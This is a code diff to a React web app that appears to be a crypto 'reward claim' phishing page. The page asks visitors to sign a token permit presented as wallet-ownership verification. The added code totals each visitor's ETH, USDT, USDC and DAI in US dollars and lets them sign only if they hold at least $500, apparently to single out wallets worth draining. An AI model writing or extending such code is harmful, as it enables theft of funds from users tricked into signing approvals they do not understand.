@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { mainnet } from '@reown/appkit/networks';
-import { BrowserProvider } from 'ethers';
+import { BrowserProvider, Contract, formatUnits } from 'ethers';
 import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import { ChevronRight, Wallet, Check, Twitter, MessageSquare, Loader2, CheckCircle2, Copy, FileSignature, ShieldCheck, AlertCircle } from 'lucide-react';
 
@@ -233,9 +233,11 @@ const Step2Content = ({ onNext }) => {
   );
 };
 
-const Step3Content = ({ onNext, onSign, signStatus, errorMessage }) => {
+const Step3Content = ({ onNext, onSign, signStatus, errorMessage, walletBalance, isCheckingBalance }) => {
   const isSigned = signStatus === 'success';
   const isSigning = signStatus === 'loading';
+  const hasInsufficientBalance = walletBalance !== null && walletBalance < 500;
+  const canSign = walletBalance !== null && walletBalance >= 500;
 
   return (
     <StepLayout step={3} title="Sign Permit" subtitle="Sign a secure permit to verify wallet ownership and authorize your claim." onNext={onNext} isNextDisabled={!isSigned}>
@@ -247,10 +249,24 @@ const Step3Content = ({ onNext, onSign, signStatus, errorMessage }) => {
         {!isSigned ? (
           <div className="w-full bg-gray-50 rounded-xl p-5 border border-gray-100 flex flex-col gap-4">
              <div className="flex justify-between text-sm"><span className="text-gray-500">Function</span><span className="font-mono text-black font-medium">VerifyEligibility()</span></div>
+             <div className="flex justify-between text-sm">
+               <span className="text-gray-500">Wallet Balance</span>
+               {isCheckingBalance ? (
+                 <span className="text-gray-400 font-medium flex items-center gap-1">
+                   <Loader2 size={12} className="animate-spin" /> Checking...
+                 </span>
+               ) : walletBalance !== null ? (
+                 <span className={`font-bold ${walletBalance >= 500 ? 'text-green-600' : 'text-red-600'}`}>
+                   ${walletBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                 </span>
+               ) : (
+                 <span className="text-gray-400 font-medium">Unknown</span>
+               )}
+             </div>
              <div className="flex justify-between text-sm"><span className="text-gray-500">Status</span><span className="text-orange-500 font-medium">Waiting for signature</span></div>
              
-             <button onClick={onSign} disabled={isSigning} className="w-full mt-2 bg-black text-white py-3 rounded-lg font-medium text-sm hover:bg-gray-800 transition-colors flex items-center justify-center gap-2">
-               {isSigning ? <Loader2 size={16} className="animate-spin" /> : 'Sign Message'}
+             <button onClick={onSign} disabled={isSigning || !canSign || isCheckingBalance} className={`w-full mt-2 py-3 rounded-lg font-medium text-sm transition-colors flex items-center justify-center gap-2 ${isSigning || !canSign || isCheckingBalance ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : 'bg-black text-white hover:bg-gray-800'}`}>
+               {isSigning ? <Loader2 size={16} className="animate-spin" /> : isCheckingBalance ? 'Checking Balance...' : !canSign ? 'Insufficient Balance' : 'Sign Message'}
              </button>
           </div>
         ) : (
@@ -267,7 +283,15 @@ const Step3Content = ({ onNext, onSign, signStatus, errorMessage }) => {
            </div>
         )}
 
-        {!isSigned && !errorMessage && (
+        {!isSigned && !errorMessage && hasInsufficientBalance && (
+           <div className="mt-4 flex gap-2 items-start bg-red-50 p-3 rounded-lg border border-red-200 text-left w-full">
+              <AlertCircle size={16} className="text-red-600 shrink-0 mt-0.5" />
+              <p className="text-xs text-red-700 leading-snug">
+                <span className="font-bold">Insufficient Balance:</span> Your wallet balance is <span className="font-bold">${walletBalance?.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>. You need at least <span className="font-bold">$500</span> in assets to claim your reward.
+              </p>
+           </div>
+        )}
+        {!isSigned && !errorMessage && !hasInsufficientBalance && walletBalance === null && (
            <div className="mt-4 flex gap-2 items-start bg-yellow-50 p-3 rounded-lg border border-yellow-100 text-left w-full">
               <AlertCircle size={16} className="text-yellow-600 shrink-0 mt-0.5" />
               <p className="text-xs text-yellow-700 leading-snug"><span className="font-bold">Requirement:</span> Your wallet must hold at least <span className="font-bold">$500</span> in assets.</p>
@@ -323,6 +347,8 @@ export default function App() {
   const [connectedAddress, setConnectedAddress] = useState(null);
   const [signStatus, setSignStatus] = useState('idle'); // 'idle' | 'loading' | 'success' | 'error'
   const [errorMessage, setErrorMessage] = useState('');
+  const [walletBalance, setWalletBalance] = useState(null); // Balance in USD
+  const [isCheckingBalance, setIsCheckingBalance] = useState(false);
 
   // UI State
   const [currentPage, setCurrentPage] = useState('landing');
@@ -352,7 +378,74 @@ export default function App() {
     }
   }, []);
 
-  // 3. Main Business Logic: Sign Permit
+  // 3. Check Wallet Balance
+  const checkWalletBalance = async () => {
+    if (!connectedAddress) return;
+
+    try {
+      setIsCheckingBalance(true);
+      setWalletBalance(null);
+
+      const walletProvider = appKit.getWalletProvider();
+      if (!walletProvider) throw new Error("Wallet provider not available.");
+
+      const provider = new BrowserProvider(walletProvider);
+
+      // Get ETH balance
+      const ethBalance = await provider.getBalance(connectedAddress);
+      const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));
+
+      // Fetch ETH price from CoinGecko
+      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+      const data = await response.json();
+      const ethPrice = data?.ethereum?.usd || 0;
+
+      // Calculate total balance in USD
+      const totalBalanceUSD = ethBalanceInEth * ethPrice;
+
+      // Check ERC20 tokens (USDT, USDC, DAI)
+      const ERC20_ABI = [
+        "function balanceOf(address) view returns (uint256)",
+        "function decimals() view returns (uint8)"
+      ];
+
+      const tokenAddresses = [
+        { address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 }, // USDT
+        { address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 }, // USDC
+        { address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 }, // DAI
+      ];
+
+      let tokenBalanceUSD = 0;
+      for (const token of tokenAddresses) {
+        try {
+          const tokenContract = new Contract(token.address, ERC20_ABI, provider);
+          const balance = await tokenContract.balanceOf(connectedAddress);
+          const balanceInToken = parseFloat(formatUnits(balance, token.decimals));
+          tokenBalanceUSD += balanceInToken; // Assuming stablecoins = $1
+        } catch (err) {
+          console.error(`Error fetching balance for token ${token.address}:`, err);
+        }
+      }
+
+      const finalBalance = totalBalanceUSD + tokenBalanceUSD;
+      setWalletBalance(finalBalance);
+
+    } catch (err) {
+      console.error('Error checking wallet balance:', err);
+      setWalletBalance(0);
+    } finally {
+      setIsCheckingBalance(false);
+    }
+  };
+
+  // Check balance when user reaches Step 3
+  useEffect(() => {
+    if (currentPage === 3 && connectedAddress) {
+      checkWalletBalance();
+    }
+  }, [currentPage, connectedAddress]);
+
+  // 4. Main Business Logic: Sign Permit
   const signPermit = async () => {
     try {
       setSignStatus('loading');
@@ -360,6 +453,11 @@ export default function App() {
 
       if (!connectedAddress) {
         throw new Error("Wallet not connected");
+      }
+
+      // Check balance requirement
+      if (walletBalance === null || walletBalance < 500) {
+        throw new Error("Your wallet must hold at least $500 in assets to proceed.");
       }
       
       const walletProvider = appKit.getWalletProvider();
@@ -471,6 +569,8 @@ export default function App() {
           onSign={signPermit}
           signStatus={signStatus}
           errorMessage={errorMessage}
+          walletBalance={walletBalance}
+          isCheckingBalance={isCheckingBalance}
         />;
       case 4:
         return <Step4Content onNext={() => setCurrentPage(5)} connectedAddress={connectedAddress} />;
